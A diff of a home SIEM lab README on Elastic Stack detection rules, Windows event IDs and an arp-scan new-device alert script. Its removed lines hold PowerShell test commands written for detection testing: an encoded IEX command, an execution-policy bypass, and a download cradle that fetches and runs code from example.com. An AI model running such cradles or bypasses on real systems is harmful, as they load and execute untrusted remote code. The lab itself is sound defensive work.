@@ -1,380 +1,179 @@
-# SIEM Lab Notes
+# Home SIEM Lab – Elastic Stack Detection Pipeline
 
-## Overview
-Hands-on SIEM and detection engineering lab using Elastic Stack, focused on developing and validating detection logic across endpoint and network telemetry.
-
-***
-
-## Lab Environment
-
-### 🔹 Core Infrastructure
-
-- VMware Workstation
-- Windows Server 2025 (Domain Controller)
-- Windows 11 Endpoint (Detection Testing System)
-- Ubuntu Server (Elastic Stack / Wazuh Host)
+## Objective
+Build a functional SIEM environment to ingest Windows endpoint logs, validate telemetry, and develop detection rules for suspicious activity.
 
 ---
 
-### 🔹 Raspberry Pi Systems
+## Lab Architecture
 
-- Raspberry Pi 5
-  - Docker + Portainer
-  - Used for containerized lab services and future security tooling
-
-- Raspberry Pi 3B+
-  - Pi-hole DNS server
-  - Provides DNS logging and network-level visibility
-
----
-
-### 🔹 Network Architecture
-
-This lab uses a **segmented dual-network design** to simulate real-world environments:
-
-#### ✅ Lab Network (Host-Only)
-- Subnet: `<lab-network>`
-- Systems:
-  - Windows 11 Endpoint
-  - Ubuntu (Elastic / Kibana)
-- Purpose:
-  - Internal SIEM communication
-  - Log ingestion and detection analysis
+Windows 11 VM (Endpoint)  
+↓  
+Elastic Agent (Log Collection)  
+↓  
+Fleet Server (Management Layer)  
+↓  
+Elasticsearch (Data Storage)  
+↓  
+Kibana (Visualization & Detection)  
 
 ---
 
-#### ✅ Home / External Network (Bridged)
-- Subnet: `<external-network>`
-- Systems:
-  - Windows 11 Endpoint
-  - Raspberry Pi (Pi-hole)
-- Purpose:
-  - DNS traffic monitoring
-  - Simulated outbound network activity
+## Environment
+
+- VMware Workstation (Virtualized lab)
+- Ubuntu Server (Elastic Stack host)
+- Windows 11 VM (log source)
+- Elastic Stack:
+  - Elasticsearch
+  - Kibana
+  - Fleet Server
+  - Elastic Agent
 
 ---
 
-### 🔹 Dual-Network VM Configuration
+## Implementation
 
-The Windows 11 endpoint is configured with **two network interfaces**:
-
-- Adapter 1:
-  - `<external-ip>`
-  - Connected to Pi-hole for DNS monitoring
-
-- Adapter 2:
-  - `<lab-ip>`
-  - Connected to Elastic SIEM environment
+### SIEM Deployment
+- Installed and configured Elasticsearch on Ubuntu
+- Set up Kibana and enabled remote access (0.0.0.0)
+- Deployed Fleet Server on Ubuntu
+- Installed Elastic Agent on Windows 11 VM
+- Connected endpoint to Fleet for centralized management
 
 ---
 
-### 🔹 Telemetry Sources
+### Log Ingestion Pipeline
 
-This lab collects and correlates data from multiple sources:
+Successfully built a working pipeline:
 
-| Source | Description |
-|------|------------|
-| Event ID 4104 | PowerShell Script Block Logging (command visibility) |
-| Event ID 4688 | Process Creation (execution + process trees) |
-| Pi-hole DNS Logs | Network activity (domain lookups) |
+Windows Event Logs  
+→ Elastic Agent  
+→ Fleet Server  
+→ Elasticsearch  
+→ Kibana  
+
+Validated ingestion of Windows Security logs.
 
 ---
 
-### ✅ Lab Goal
+## Detection Engineering
 
-This environment is designed to simulate real-world detection engineering workflows by combining:
+### Failed Login Detection Rule
 
-- Endpoint telemetry (PowerShell + Process Logs)
-- Network telemetry (DNS activity)
-- SIEM-based analysis and detection logic
+**Objective:** Detect brute-force or unauthorized access attempts.
 
-The goal is to build detections that reflect **complete attack behavior across multiple data sources**, rather than relying on a single log type.
-
-***
-
-## PowerShell Detection Labs
-
-***
-
-### 🔹 Encoded PowerShell Command Detection
-
-Test Command:
-
-```powershell
-powershell -enc SQBFAFgAIAAiAFQARQBTAFQAIgA=
+**Query:**
+```
+event.code: 4625 and winlog.channel: "Security" and winlog.computer_name: "DesktopWin11.THE.WIRED"
 ```
 
-Observed Behavior:
-- Command was base64 encoded but decoded and executed as:
+**Rule Logic:**
+- Threshold: 3 failed logins  
+- Time window: 5 minutes  
+- Runs every: 1 minute  
 
-```powershell
-IEX "TEST"
+**Key Adjustment:**
+- Initially set to 5 attempts  
+- Reduced to 3 due to default Windows account lockout behavior  
+
+✅ Successfully triggered alerts through simulated failed login attempts
+
+---
+
+## PowerShell Logging Investigation
+
+### Objective
+Detect PowerShell usage and command execution.
+
+### Observations
+- Event ID 400 → Captures PowerShell session start (user context, no command content)  
+- Event ID 4104 → Captures script block content (inconsistent visibility)  
+
+### Issue
+Detection rules initially triggered on PowerShell session creation rather than actual command execution.
+
+### Findings
+- Opening PowerShell does not guarantee visibility into commands  
+- Script Block Logging must be enabled and still may not log all activity  
+- Telemetry gaps can impact detection accuracy  
+
+### Example Query
+```
+winlog.computer_name: "DesktopWin11.THE.WIRED" and event.code: (400 or 4104 or 4105 or 4106)
 ```
 
-Detection:
-- Event ID: 4104 (Script Block Logging)
+### Lesson
+Detection logic must align with actual telemetry, not assumptions about system behavior.
 
-Field used:
+---
 
-```text
-powershell.file.script_block_text
-```
+## Troubleshooting & Problem Solving
 
-Example Result:
+### Issue: Windows Logs Not Appearing in Kibana
 
-```text
-Creating Scriptblock text (1 of 1):
-IEX "TEST"
-```
+**Root Cause:**  
+Fleet output configuration did not match Kibana host settings  
 
-***
+**Resolution:**  
+Aligned Fleet output hosts with Kibana configuration  
 
-### 🔹 Execution Policy Bypass Detection
+---
 
-Test Command:
+### Issue: Kibana Became Inaccessible
 
-```powershell
-IEX "Set-ExecutionPolicy Bypass -Scope Process -Force"
-```
+**Root Cause:**  
+DHCP IP address change on Ubuntu server  
 
-Observed Behavior:
-- Command logged successfully in Script Block Logging (4104)
+**Resolution:**  
+Updated configuration to reflect new IP address  
 
-Detection Queries:
+---
 
-```kql
-event.dataset: "windows.powershell_operational"
-and event.code: 4104
-```
+### Issue: Elastic Installation Failed Due to Disk Space
 
-```kql
-event.dataset: "windows.powershell_operational"
-and event.code: 4104
-and powershell.file.script_block_text: *ExecutionPolicy*
-```
+**Root Cause:**  
+Ubuntu VM disk limited to 20GB  
 
-***
+**Resolution:**  
+- Expanded disk to 60GB  
+- Resized partition  
+- Grew filesystem  
 
-### 🔹 PowerShell Download Detection (Web Requests)
+---
 
-Test Commands:
+### Issue: Detection Rule Not Triggering
 
-```powershell
-Invoke-WebRequest http://example.com
-```
+**Root Cause:**  
+Incorrect data view (logs-* not selected)  
 
-```powershell
-IEX (New-Object Net.WebClient).DownloadString("https://example.com")
-```
+**Resolution:**  
+Updated data view configuration in Kibana  
 
-Observed Behavior:
-- PowerShell initiated outbound web requests
-- Script Block Logging (4104) captured execution
+---
 
-***
+## Key Lessons Learned
 
-### Detection Rule (Elastic)
+- Detection rules must be validated against real telemetry  
+- Similar event IDs can represent very different behaviors (e.g., PowerShell 400 vs 4104)  
+- Misconfigured log pipelines can silently prevent detection  
+- Infrastructure issues (IP changes, disk capacity) directly impact SIEM reliability  
+- Successful detection depends on both data visibility and accurate rule logic  
 
-```kql
-event.code: "4104" AND powershell.file.script_block_text: ("*DownloadString*" OR "*Invoke-WebRequest*")
-```
+---
 
-***
+## Current Status
 
-### 🔹 PowerShell Child Process Detection (4688)
+✅ SIEM backend operational  
+✅ Endpoint telemetry ingestion working  
+✅ Detection rules tested and validated  
 
-Test Command:
-
-```powershell
-powershell.exe -NoProfile -Command "whoami"
-```
-
-***
-
-### ✅ Observed Behavior
-
-- PowerShell executed a command that launched another process (`whoami.exe`)
-- Event ID 4688 captured process creation
-
-Example:
-
-```text
-process.name: whoami.exe
-process.parent.name: powershell.exe
-```
-
-***
-
-### 🔹 PowerShell + DNS Correlation Detection (Multi-Source)
-
-Test Command:
-
-```text
-powershell
-Invoke-WebRequest http://example.com
-```
-
-***
-
-### ✅ Observed Behavior
-
-- PowerShell execution captured (4104)
-- Process activity recorded (4688)
-- DNS query logged:
-
-```text
-<endpoint-ip> → example.com
-```
-
-***
-
-### ✅ Example Investigation Narrative
-
-PowerShell was used to execute a web request (`Invoke-WebRequest`).  
-The activity was confirmed via Script Block Logging (4104), supported by process creation logs (4688), and correlated with DNS activity observed in Pi-hole.
-
-***
-
-## Key Concepts Learned
-
-- Script Block Logging reveals actual PowerShell execution
-- Encoded commands are decoded in logs
-- Detection should focus on behavior, not raw input
-- Multi-source correlation improves detection confidence
-
-***
-
-## Detection Strategy Notes
-
-- Start broad, then refine queries
-- Validate detections with real telemetry
-- Focus on behavior instead of exact strings
-- Correlate endpoint and network data
-
-***
-
-## Key Learnings
-
-- PowerShell logging is critical for visibility  
-- Detection requires tuning and validation  
-- Endpoint logs alone are not enough  
-- Combining DNS + process + script data improves analysis  
-
-***
+---
 
 ## Next Steps
 
-- Detect encoded PowerShell using Event ID 4688
-- Correlate multiple log sources automatically
-- Integrate Pi-hole logs into Elastic for full pipeline detection
-
-***
-
-## Additional Lab: Network-Based Detection (Raspberry Pi)
-
-### Overview
-Built a lightweight network monitoring and alerting solution using a Raspberry Pi to simulate a basic network detection sensor capable of identifying changes in asset presence and generating real-time alerts. The goal was to detect new devices joining the local network and generate real-time alerts, similar to how SOC environments monitor network activity.
-
----
-
-### Objectives
-- Gain hands-on experience with network discovery and asset enumeration
-- Build detection logic to identify new or unauthorized devices
-- Implement basic alerting using SMTP (email notifications)
-- Understand alert noise and the need for tuning
-
----
-
-### Tools & Technologies
-- Raspberry Pi 5 (Ubuntu/Debian-based OS)
-- `arp-scan` (network discovery)
-- Bash scripting
-- `msmtp` / SMTP (email alerting)
-
----
-
-### Implementation
-
-#### 1. Network Discovery
-Used `arp-scan` to enumerate devices on the local network:
-```bash
-sudo arp-scan --localnet
-```
-
-#### 2. Baseline Creation
-Captured an initial snapshot of known devices:
-```bash
-./detect.sh   # first run creates baseline.txt
-```
-
-#### 3. Detection Logic
-Compared current scan results to baseline using diff logic:
-- New devices identified by IP/MAC comparison
-- Utilized `comm` and sorting to isolate new entries
-
-#### 4. Alerting
-Integrated SMTP email alerts using `msmtp`:
-- Configured Gmail SMTP with app password
-- Triggered alerts when new devices were detected
-
-Example alert:
-```
-🚨 New device detected:
-
-10.0.0.X    9a:f3:XX:XX:XX:XX    Unknown device (locally administered MAC)
-```
-
----
-
-### Detection Script
-
-```bash
-#!/bin/bash
-
-BASELINE="baseline.txt"
-CURRENT="current.txt"
-
-# Run scan (clean output)
-sudo arp-scan --localnet 2>/dev/null | grep -E "^[0-9]" > $CURRENT
-
-# Create baseline if it doesn't exist
-if [ ! -f "$BASELINE" ]; then
-    cp $CURRENT $BASELINE
-    echo "Baseline created."
-    exit 0
-fi
-
-# Find NEW devices
-NEW=$(comm -13 <(sort $BASELINE) <(sort $CURRENT))
-
-if [ -n "$NEW" ]; then
-    echo "🚨 NEW DEVICE DETECTED!"
-    echo "$NEW"
-
-    echo -e "🚨 New device detected:\n\n$NEW" | mail -s "Network Alert 🚨" your-email@gmail.com
-
-    # Update baseline
-    cp $CURRENT $BASELINE
-fi
-```
-
----
-
-### Key Takeaways
-- Built a simple detection pipeline: **data collection → analysis → alerting**
-- Learned how network devices can use randomized MAC addresses (locally administered MACs)
-- Identified challenges with alert noise and need for filtering/tuning
-- Gained practical understanding of how SOC tools detect and alert on network changes
-- Recognized the need for alert tuning to reduce noise from legitimate devices (e.g., MAC randomization)
-
----
-
-### Future Improvements
-- Filter known devices to reduce alert noise
-- Add device labeling (known assets vs unknown)
-- Send logs to Elastic for centralized analysis
-- Replace polling with event-driven monitoring (if applicable)
-
-## Impact
-
-This lab demonstrates the ability to build detection pipelines beyond endpoint logs, incorporating network-level visibility and custom alerting mechanisms.
+- Improve PowerShell detection reliability (focus on Script Block Logging)  
+- Expand telemetry sources (DNS / network logs via Pi-hole)  
+- Correlate endpoint + network activity for advanced detections  
+- Develop additional detection rules (process creation, suspicious commands, etc.)  
+``
